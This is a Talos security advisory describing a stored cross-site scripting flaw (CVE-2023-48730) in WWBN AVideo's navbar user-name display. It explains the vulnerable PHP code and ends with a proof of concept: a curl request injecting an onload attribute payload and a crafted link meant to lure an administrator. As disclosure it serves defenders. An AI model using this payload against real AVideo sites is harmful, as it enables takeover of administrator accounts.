# Talos Vulnerability Report

### TALOS-2023-1882

## WWBN AVideo navbarMenuAndLogo.php user name cross-site scripting (XSS) vulnerability

##### January 10, 2024

##### CVE Number

CVE-2023-48730

##### SUMMARY

A cross-site scripting (xss) vulnerability exists in the navbarMenuAndLogo.php user name functionality of WWBN AVideo dev master commit 15fed957fb. A specially crafted HTTP request can lead to arbitrary Javascript execution. An attacker can get a user to visit a webpage to trigger this vulnerability.

##### CONFIRMED VULNERABLE VERSIONS

The versions below were either tested or verified to be vulnerable by Talos or confirmed to be vulnerable by the vendor.

WWBN AVideo dev master commit 15fed957fb

##### PRODUCT URLS

AVideo - <https://github.com/WWBN/AVideo>

##### CVSSv3 SCORE

8.5 - CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H

##### CWE

CWE-79 - Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)

##### DETAILS

AVideo is a web application, mostly written in PHP, that can be used to create an audio/video sharing website. It allows users to import videos from various sources, encode and share them in various ways. Users can sign up to the website in order to share videos, while viewers have anonymous access to the publicly-available contents. The platform provides plugins for features like live streaming, skins, YouTube uploads and more.

The PHP file `view/include/navbarMenuAndLogo.php` is vulnerable to an XSS issue due to improper sanitization of the user name.

```
    <?php
[1] if (!empty($advancedCustomUser->keepViewerOnChannel) && !empty($_SESSION['channelName'])) {
        $user = User::getChannelOwner($_SESSION['channelName']);
        ?>
        <li>
            <a class="navbar-brand"  href="#" onclick="avideoModalIframeFull('<?php echo User::getChannelLinkFromChannelName($_SESSION['channelName']); ?>');
                        return false;" >
[2]             <img src="<?php echo User::getPhoto($user['id']); ?>" alt="<?php echo User::getNameIdentificationById($user['id']); ?>"
                     class="img img-circle " style="height: 33px; width: 33px; margin-right: 15px;">
            </a>
        </li>
        <?php
    }

```

At [1], if `keepViewerOnChannel` and `channelName` are set, the user name for the current `channelName` is echoed at [2], using `User::getNameIdentificationById`:

```
    public static function getNameIdentificationById($id = "")
    {
        if (!empty($id)) {
            $user = new User($id);
            return $user->getNameIdentificationBd();
        }
        return __("Unknown User");
    }

    public function getNameIdentificationBd()
    {
        global $advancedCustomUser;
[3]     if (!empty($this->name) && empty($advancedCustomUser->doNotIdentifyByName)) {
            return $this->name;
        }
        if (!empty($this->email) && empty($advancedCustomUser->doNotIdentifyByEmail)) {
            return $this->email;
        }
        if (!empty($this->user) && empty($advancedCustomUser->doNotIdentifyByUserName)) {
            return $this->user;
        }
        if (!empty($this->channelName)) {
            return $this->channelName;
        }
        return __("Unknown User");
    }

```

Essentially, unless `doNotIdentifyByName` is set (it’s unset by default), the user name will be returned [3], which corresponds to the `name` field of the `User` object. The name field is originally set using `setName`:

```
public function setName($name)
{
    $this->name = strip_tags($name);
}

```

`strip_tags` is used to remove tags, which could be used to inject arbitrary JavaScript. However, since the user name is echoed inside an `<img>` tag, there’s no need to inject tags in order to execute arbitrary JavaScript.

For example, a privileged attacker could change their user name to `someuser" onload="alert(1)`, which would execute `alert(1)` without using tags and thus bypass the `strip_tag` in `setName`.

To exploit this, an attacker can trick the administrator into browsing any page that includes `navbarMenuAndLogo.php` and sets the `channelName` field in session. An example of such page is `view/modeYoutube.php`, which includes `view/include/navbar.php`, which in turn includes `view/include/navbarMenuAndLogo.php`.

`$_SESSION['channelName']` is set in `view/include/navbar.php` [4]:

```
    if (!empty($advancedCustomUser->keepViewerOnChannel)) {
        if (!empty($_GET['channelName'])) {
            _session_start();
[4]         $_SESSION['channelName'] = $_GET['channelName'];
        }
        if (!empty($_GET['leaveChannel'])) {
            _session_start();
            unset($_SESSION['channelName']);
        }
    }

```

Note that `$advancedCustomUser->keepViewerOnChannel` needs to be set, so exploitation of this vulnerability requires the non-default setting `keepViewerOnChannel` to be set in the `CustomizeUser` plugin.

Exploitation leads to a straightforward stored cross-site scripting issue (XSS) when visiting any page in the site that includes the navbar (including the main application page). This can be used by an attacker, in the worst case, to take over an administrator account, for example by tricking an administrator into visiting a specially crafted link.

### Exploit Proof of Concept

This proof-of-concept calls `alert(1)`:

```
$ curl -k $'https://localhost/objects/userUpdate.json.php' \
       -H 'Cookie: 84b11d010cced71edffee7aa62c4eda0=bir8alr05n4s0tjaqninjjnr66' \
       -H 'Referer: https://localhost/user' \
       --data-raw $'user=user1&pass=&email=user1@localhost&phone=&name=someuser" onload="alert(1)&about=&channelName=User1&donationLink=&analyticsCode='
{"error":false,"msg":"","users_id":2}

```

Trick the administrator into visiting the `view/modeYoutube.php` page by clicking the following URL, which will set the `channelName` in session:

```
https://localhost/view/modeYoutube.php?channelName=User1

```

Make sure to use the user channel name, in this case “User1”.

At this point, visiting any page (simply visiting `https://localhost` is enough) will lead to executing `alert(1)`.
